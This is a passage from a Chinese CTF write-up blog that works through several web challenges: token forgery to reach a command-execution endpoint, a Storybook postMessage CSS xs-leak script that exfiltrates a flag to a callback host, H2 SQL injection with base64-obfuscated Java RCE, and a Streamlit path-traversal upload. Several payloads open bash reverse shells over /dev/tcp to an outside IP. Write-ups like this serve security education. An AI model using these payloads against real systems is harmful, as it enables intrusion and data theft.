<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/getInnerLoginInfo</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>60.205.163.215:27139</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://60.205.163.215:27139</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ftoken=bee5e43e04ac40b74d4c1b96357cb474;ttoken=LQ4uFmGJEp4DWrffPET1HWOKiqV59NqYImK4LKG2lY4VEJ/7OF2p8VvKgRLXUnUNchQbvw==;tusername=wanglaoliu66;trole=ee;username=wanglaoliu66</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>32</span><br><span class="line"></span><br><span class="line"><span class="language-nix">u<span class="attr">sername</span><span class="operator">=</span>wanglaoliu66&amp;password<span class="operator">=</span>qwe123123&amp;type<span class="operator">=</span><span class="number">2</span>&amp;tusername<span class="operator">=</span>wanglaoliu66&amp;trole<span class="operator">=</span>ee</span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">HTTP<span class="symbol">/1.1</span> <span class="number">200</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> application<span class="symbol">/json</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Date:</span> Mon, <span class="number">13</span> Oct <span class="number">2025</span> <span class="number">15</span>:<span class="number">04</span>:<span class="number">29</span> GMT</span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Length:</span> <span class="number">166</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">&#123;<span class="string">&quot;tusername&quot;</span>:<span class="string">&quot;wanglaoliu66&quot;</span>,<span class="string">&quot;ttimestamp&quot;</span>:<span class="string">&quot;1760367869&quot;</span>,<span class="string">&quot;trole&quot;</span>:<span class="string">&quot;ee&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ttoken&quot;</span>:<span class="string">&quot;3jf36C0L34Xvqw/eyfpOeoQKDisPnatcGjgdiVndF5ICJhzoBWD6HzgRwJbtiBQB93NjSw==&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>尝试发现ttoken 不能单独作为鉴权，那应该在&#x2F;getNewToken 尝试顶替 管理员的身份</p>
<p>试来试去发现把 &#x2F;getInnerLoginInfo 这个返回的值全放进cookie 得到的是 ee的权限</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/getNewToken</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>60.205.163.215:27139</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://60.205.163.215:27139</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>tusername=wanglaoliu66;ttimestamp=1760367869;trole=ee;success=true;ttoken=3jf36C0L34Xvqw/eyfpOeoQKDisPnatcGjgdiVndF5ICJhzoBWD6HzgRwJbtiBQB93NjSw==</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">200</span></span></span><br><span class="line"><span class="language-http"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>jtoken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ3YW5nbGFvbGl1NjYiLCJyb2xlIjoiY2MiLCJpYXQiOjE3NjAzNjc4ODgsImV4cCI6MTc2MDQ1NDI4OH0.wkESQ0HqrVvF6oK9HzWJQEtkDk4nkkqCRfWaWOI35yM; Max-Age=86400; Expires=Tue, 14 Oct 2025 15:04:48 GMT; Path=/; HttpOnly</span></span><br><span class="line"><span class="language-http"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span></span><br><span class="line"><span class="language-http"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 13 Oct 2025 15:04:48 GMT</span></span><br><span class="line"><span class="language-http"><span class="attribute">Content-Length</span><span class="punctuation">: </span>68</span></span><br><span class="line"><span class="language-http"></span></span><br><span class="line"><span class="language-http"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;success&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;ftoken=4617703efe7c1f4c23007c80199fc21c&quot;</span><span class="punctuation">&#125;</span></span></span></span><br></pre></td></tr></table></figure>

<p>最后进dashboard host伪造执行命令即可</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/innerCommandExec</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>jtoken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ3YW5nbGFvbGl1NjYiLCJyb2xlIjoiZWUiLCJpYXQiOjE3NjAzNjgxNTAsImV4cCI6MTc2MDQ1NDU1MH0.VPRheQGjEJEgWHOtNVESGQpLeuvL9zwroEigDJ5BzQg</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>12</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;cmd&quot;</span><span class="punctuation">:</span><span class="string">&quot;cat flag&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="我的CTF故事"><a href="#我的CTF故事" class="headerlink" title="我的CTF故事"></a>我的CTF故事</h3><p>实在找不到xss点那估计是xs-leak</p>
<p>flag 首先存在cookie中，而helloworld 的页面把cookie的flag写入页面，即想办法往bot访问的helloworld页面里注入css代码来xsleak</p>
<p>bot访问页面可控，即可执行任意script</p>
<p>查查storybook相关漏洞 (实则没找到，ai写着写着出来了)</p>
<p><a target="_blank" rel="noopener" href="https://storybook.org.cn/docs/essentials/toolbars-and-globals">工具栏与全局变量 | Storybook 文档 - Storybook 中文</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/legionhunters/hijacking-sessions-with-postmessage-the-silent-dom-xss-threat-41a8a59dd9b4">medium.com</a></p>
<p><a target="_blank" rel="noopener" href="https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation">postMessage Exploitation | Practical CT</a></p>
<p><a target="_blank" rel="noopener" href="https://codemia.io/knowledge-hub/path/how_to_apply_css_to_iframe">Home Knowledge Hub Details</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> story = <span class="string">&quot;http://localhost/iframe.html?viewMode=story&amp;id=example-helloworld--default&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> basePrefix = <span class="string">&quot;flag&#123;d8df3ea6-b0c3-44f3-a6f9-b50348465951&#125;&quot;</span>; <span class="comment">// 已有前缀 </span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> cbBase = <span class="string">&quot;http://162.210.192.205:52866&quot;</span>; <span class="comment">// 你的回调主机 </span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> candidates = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789-&#125;&quot;</span>; <span class="comment">// 共38 </span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> waitMs = <span class="number">100</span>; <span class="comment">// 每个候选等待窗口 </span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> openDelay = <span class="number">500</span>; <span class="comment">// 打开后首次 postMessage 延迟 </span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> resend = <span class="number">1</span>; <span class="comment">// 每个候选额外重复发送次数（可设为2提高成功率） </span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">msgForCss</span>(<span class="params">cssVal</span>) &#123; <span class="comment">// 组装 storybook channel 消息 </span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> payload = &#123; <span class="attr">key</span>: <span class="string">&quot;storybook-channel&quot;</span>, <span class="attr">event</span>: &#123; <span class="attr">source</span>: <span class="string">&quot;preview&quot;</span>, <span class="attr">type</span>: <span class="string">&quot;updateGlobals&quot;</span>, <span class="attr">args</span>: [&#123; <span class="attr">globals</span>: &#123; <span class="attr">backgrounds</span>: &#123; <span class="attr">value</span>: cssVal &#125; &#125;, <span class="attr">options</span>: &#123; <span class="attr">target</span>: <span class="string">&quot;storybook-preview-iframe&quot;</span> &#125; &#125;] &#125; &#125;; <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payload);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">buildCss</span>(<span class="params">prefixPlus</span>) &#123; <span class="comment">// 生成注入 CSS；注意把引号和反斜杠处理到 JSON 字符串里 </span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> url = cbBase + <span class="string">&quot;/&quot;</span> + <span class="built_in">encodeURIComponent</span>(prefixPlus); </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> css = <span class="string">&quot;aa&#125; #secret[data-flag^=&#x27;&quot;</span> + prefixPlus + <span class="string">&quot;&#x27;]&#123;background-image: url(&#x27;&quot;</span> + url + <span class="string">&quot;&#x27;);&#125;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> css.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&quot;\\\\&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    (<span class="keyword">function</span> <span class="title function_">run</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> w = <span class="variable language_">window</span>.<span class="title function_">open</span>(story);</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setTimeout</span>(<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; candidates.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> ch = candidates[i]; <span class="keyword">var</span> probe = basePrefix + ch; <span class="keyword">var</span> cssVal = <span class="title function_">buildCss</span>(probe); <span class="keyword">var</span> msg = <span class="title function_">msgForCss</span>(cssVal);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">try</span> &#123; <span class="keyword">if</span> (w &amp;&amp; !w.<span class="property">closed</span>) w.<span class="title function_">postMessage</span>(msg, <span class="string">&quot;*&quot;</span>); &#125; <span class="keyword">catch</span> (e) &#123; &#125; <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="number">1</span>; r &lt; resend; r++) &#123; <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">setTimeout</span>(res, <span class="number">120</span>)); <span class="keyword">try</span> &#123; <span class="keyword">if</span> (w &amp;&amp; !w.<span class="property">closed</span>) w.<span class="title function_">postMessage</span>(msg, <span class="string">&quot;*&quot;</span>); &#125; <span class="keyword">catch</span> (e) &#123; &#125; &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">setTimeout</span>(res, waitMs));</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;, openDelay);</span></span><br><span class="line"><span class="language-javascript">    &#125;)(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>逐字节泄露flag即可</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">for i in range(100):</span><br><span class="line">    r = remote(&quot;60.205.163.215&quot;, 42746)</span><br><span class="line">    r.sendline(b&quot;http://162.210.192.205:52866/3.html&quot;)</span><br><span class="line">    r.recvrepeat(5)</span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure>

<h3 id="？？EasyDB"><a href="#？？EasyDB" class="headerlink" title="？？EasyDB"></a>？？EasyDB</h3><p>validUser处存在sql注入，查看数据库为h2</p>
<p>参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13371">JDBC-Attack 攻击利用汇总-先知社区</a></p>
<p>有check 检查关键字</p>
<p>可以用alias方式反射+base64或拼接绕过</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">## base64 绕过</span><br><span class="line">&#x27;;CREATE ALIAS hello1 AS $$ String hello() throws Exception <span class="punctuation">&#123;</span> Class c = Class.forName(new String(java.util.Base64.getDecoder().decode(<span class="string">&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;</span>)));java.lang.reflect.Method m1 = c.getMethod(new String(java.util.Base64.getDecoder().decode(<span class="string">&quot;Z2V0UnVudGltZQ==&quot;</span>)));Object o = m1.invoke(<span class="literal"><span class="keyword">null</span></span>);java.lang.reflect.Method m2 = c.getMethod(new String(java.util.Base64.getDecoder().decode(<span class="string">&quot;ZXhlYw==&quot;</span>))<span class="punctuation">,</span> String<span class="punctuation">[</span><span class="punctuation">]</span>.class);m2.invoke(o<span class="punctuation">,</span> new Object<span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#123;</span>new String<span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#123;</span><span class="string">&quot;/bin/bash&quot;</span><span class="punctuation">,</span> <span class="string">&quot;-c&quot;</span><span class="punctuation">,</span> new String(java.util.Base64.getDecoder().decode(<span class="string">&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xNjIuMjEwLjE5Mi4yMDUvNTcxNjcgMD4mMQ==&quot;</span>))<span class="punctuation">&#125;</span><span class="punctuation">&#125;</span>);return <span class="literal"><span class="keyword">null</span></span>; <span class="punctuation">&#125;</span>$$; CALL hello1();--</span><br><span class="line">## 字符串拼接绕过</span><br><span class="line">username=admin&#x27;; CREATE ALIAS evil1 AS $$void jerry(String cmd) throws Exception<span class="punctuation">&#123;</span> String R=<span class="string">&quot;R&quot;</span>+<span class="string">&quot;untime&quot;</span>;Class&lt;?&gt; c = Class.forName(<span class="string">&quot;java.lang.&quot;</span>+R);Object rt=c.getMethod(<span class="string">&quot;get&quot;</span>+R).invoke(<span class="literal"><span class="keyword">null</span></span>);c.getMethod(<span class="string">&quot;exe&quot;</span>+<span class="string">&quot;c&quot;</span><span class="punctuation">,</span>String.class).invoke(rt<span class="punctuation">,</span>cmd);<span class="punctuation">&#125;</span>$$;CALL evil1(&#x27;bash -c <span class="punctuation">&#123;</span>echo<span class="punctuation">,</span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xNjIuMjEwLjE5Mi4yMDUvNTcxNjcgMD4mMQ==<span class="punctuation">&#125;</span>|<span class="punctuation">&#123;</span>base64<span class="punctuation">,</span>-d<span class="punctuation">&#125;</span>|<span class="punctuation">&#123;</span>bash<span class="punctuation">,</span>-i<span class="punctuation">&#125;</span>&#x27;);--</span><br></pre></td></tr></table></figure>

<p>相关字段强制url编码传参即可，否则特殊字符传参存在问题</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ctf@t10001-comp-easydb-97431123461695070w9hv5:/$</span> <span class="string">ls</span> <span class="string">-al</span></span><br><span class="line"><span class="string">total</span> <span class="number">1380</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Oct</span> <span class="number">14</span> <span class="number">03</span><span class="string">:31</span> <span class="string">.</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Oct</span> <span class="number">14</span> <span class="number">03</span><span class="string">:31</span> <span class="string">..</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">1</span> <span class="string">ctf</span>  <span class="string">ctf</span>     <span class="number">4096 </span><span class="string">Jan</span> <span class="number">30</span>  <span class="number">2025 </span><span class="string">app</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">2</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Aug</span>  <span class="number">1</span>  <span class="number">2022 </span><span class="string">bin</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">2</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Jun</span> <span class="number">30</span>  <span class="number">2022 </span><span class="string">boot</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">5</span> <span class="string">root</span> <span class="string">root</span>     <span class="number">360</span> <span class="string">Oct</span> <span class="number">14</span> <span class="number">03</span><span class="string">:31</span> <span class="string">dev</span></span><br><span class="line"><span class="string">-rwxr-xr-x</span>   <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>     <span class="number">123</span> <span class="string">Jan</span> <span class="number">30</span>  <span class="number">2025 </span><span class="string">docker-entrypoint.sh</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Oct</span> <span class="number">14</span> <span class="number">03</span><span class="string">:31</span> <span class="string">etc</span></span><br><span class="line"><span class="string">-r--------</span>   <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>      <span class="number">43</span> <span class="string">Oct</span> <span class="number">14</span> <span class="number">03</span><span class="string">:31</span> <span class="string">flag</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Jan</span> <span class="number">30</span>  <span class="number">2025 </span><span class="string">home</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Aug</span>  <span class="number">1</span>  <span class="number">2022 </span><span class="string">lib</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">2</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Aug</span>  <span class="number">1</span>  <span class="number">2022 </span><span class="string">lib64</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">2</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Aug</span>  <span class="number">1</span>  <span class="number">2022 </span><span class="string">media</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">2</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Aug</span>  <span class="number">1</span>  <span class="number">2022 </span><span class="string">mnt</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">2</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Aug</span>  <span class="number">1</span>  <span class="number">2022 </span><span class="string">opt</span></span><br><span class="line"><span class="string">dr-xr-xr-x</span> <span class="number">584</span> <span class="string">root</span> <span class="string">root</span>       <span class="number">0</span> <span class="string">Oct</span> <span class="number">14</span> <span class="number">03</span><span class="string">:31</span> <span class="string">proc</span></span><br><span class="line"><span class="string">-rwsr-xr-x</span>   <span class="number">1</span> <span class="string">root</span> <span class="string">root</span> <span class="number">1323160</span> <span class="string">Jan</span> <span class="number">30</span>  <span class="number">2025 </span><span class="string">readflag</span></span><br><span class="line"><span class="string">drwx------</span>   <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Aug</span>  <span class="number">2</span>  <span class="number">2022 </span><span class="string">root</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">3</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Aug</span>  <span class="number">1</span>  <span class="number">2022 </span><span class="string">run</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">2</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Aug</span>  <span class="number">1</span>  <span class="number">2022 </span><span class="string">sbin</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">2</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Aug</span>  <span class="number">1</span>  <span class="number">2022 </span><span class="string">srv</span></span><br><span class="line"><span class="string">dr-xr-xr-x</span>  <span class="number">13</span> <span class="string">root</span> <span class="string">root</span>       <span class="number">0</span> <span class="string">Sep</span> <span class="number">13</span> <span class="number">07</span><span class="string">:37</span> <span class="string">sys</span></span><br><span class="line"><span class="string">drwxrwxrwt</span>   <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Oct</span> <span class="number">14</span> <span class="number">03</span><span class="string">:31</span> <span class="string">tmp</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Aug</span>  <span class="number">1</span>  <span class="number">2022 </span><span class="string">usr</span></span><br><span class="line"><span class="string">drwxr-xr-x</span>   <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">4096 </span><span class="string">Jan</span> <span class="number">30</span>  <span class="number">2025 </span><span class="string">var</span></span><br></pre></td></tr></table></figure>

<p>不多说，跟Gavatar一样有 S 属性的 &#x2F;readflag读不出flag 哈哈</p>
<h3 id="LangRAG"><a href="#LangRAG" class="headerlink" title="LangRAG"></a>LangRAG</h3><p>又一Streamlit </p>
<p>发现可以拦截修改上传文件流量，filename处有目录穿越，从而实现任意文件写</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/_stcore/upload_file/9c65407a-626f-44e9-a3c6-03abe126148e/ba5f2786-fe8d-4df2-950b-807d40e54d59</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>60.205.163.215:13466</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://60.205.163.215:13466</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryDyfLXLjdT4Fp1hG5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://60.205.163.215:13466/</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_streamlit_xsrf=2|82c5e7bc|128c5ac03fba41458e7564bbfbc9bb5e|1760537742</span><br><span class="line"><span class="attribute">X-Xsrftoken</span><span class="punctuation">: </span>2|82c5e7bc|128c5ac03fba41458e7564bbfbc9bb5e|1760537742</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>914</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryDyfLXLjdT4Fp1hG5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;pandas.py&quot;; filename=&quot;../../../../app/pandas.py&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">import</span> os </span></span><br><span class="line"><span class="language-pgsql">os.<span class="keyword">system</span>(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/162.210.192.205/57167 0&gt;&amp;1&quot;&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryDyfLXLjdT4Fp1hG5--</span></span></span><br></pre></td></tr></table></figure>

<p>Streamlit 开了 –server.runOnSave false 改完文件后也不能执行，也没翻到定时任务之类的，怪</p>
<p><strong>10.15 日 ！</strong></p>
<p>琢磨一下import的逻辑，本地测试发现载入的文件全进内存里了，修改这些文件及cache均没用</p>
<p>研究一下uv.lock </p>
